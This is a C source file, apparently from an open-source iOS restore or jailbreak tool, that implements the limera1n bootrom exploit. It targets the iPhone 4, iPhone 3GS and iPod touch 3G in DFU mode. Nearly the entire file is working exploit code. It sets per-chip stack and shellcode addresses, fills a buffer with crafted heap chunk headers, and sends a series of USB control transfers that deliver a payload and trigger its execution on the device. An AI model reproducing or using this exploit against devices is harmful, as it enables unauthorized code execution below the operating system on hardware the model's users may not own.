/*
 * limera1n.c
 * Helper code for limera1n exploit based on discovery by geohot
 * 
 * Copyright (c) 2012-2013 Nikias Bassen. All Rights Reserved.
 * Copyright (c) 2012 Martin Szulecki. All Rights Reserved.
 * Copyright (C) 2010 Chronic-Dev Team
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <libirecovery.h>

#include "common.h"
#include "limera1n.h"
#include "limera1n_payload.h"

int limera1n_exploit(struct irecv_device *device, irecv_client_t *pclient)
{
	irecv_error_t err = IRECV_E_SUCCESS;
	unsigned int i = 0;
	unsigned char buf[0x800];
	unsigned char shellcode[0x800];
	unsigned int max_size = 0x24000;
	//unsigned int load_address = 0x84000000;
	unsigned int stack_address = 0;
	unsigned int shellcode_address = 0;
	unsigned int shellcode_length = 0;

	if (device->chip_id == irecv_devices[DEVICE_IPHONE4].chip_id) {
		max_size = 0x2C000;
		stack_address = 0x8403BF9C;
		shellcode_address = 0x8402B001;
	} else if (device->chip_id == irecv_devices[DEVICE_IPHONE3GS].chip_id) {
		max_size = 0x24000;
		stack_address = 0x84033FA4;
		shellcode_address = 0x84023001;
	} else if (device->chip_id == irecv_devices[DEVICE_IPOD3G].chip_id) {
		max_size = 0x24000;
		stack_address = 0x84033F98;
		shellcode_address = 0x84023001;	
	} else {
		error("Unsupported ChipID 0x%04x. Can't exploit with limera1n.\n", device->chip_id);
		return -1;
	}

	memset(shellcode, 0x0, 0x800);
	shellcode_length = sizeof(limera1n_payload);
	memcpy(shellcode, limera1n_payload, sizeof(limera1n_payload));

	irecv_client_t client = *pclient;

	debug("Resetting device counters\n");
	err = irecv_reset_counters(client);
	if (err != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(err));
		return -1;
	}

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < 0x800; i += 0x40) {
		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}

	debug("Sending chunk headers\n");
	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}

	debug("Sending exploit payload\n");
	irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);

	debug("Sending fake data\n");
	memset(buf, 0xBB, 0x800);
	irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);

	//debug("Executing exploit\n");
	irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);

	irecv_reset(client);
	irecv_finish_transfer(client);
	debug("Exploit sent\n");

	debug("Reconnecting to device\n");
	*pclient = irecv_reconnect(client, 7);
	if (*pclient == NULL) {
		error("Unable to reconnect\n");
		return -1;
	}
	if ((*pclient)->mode != kDfuMode) {
		error("Device reconnected in non-DFU mode\n");
		return -1;
	}

	return 0;
}
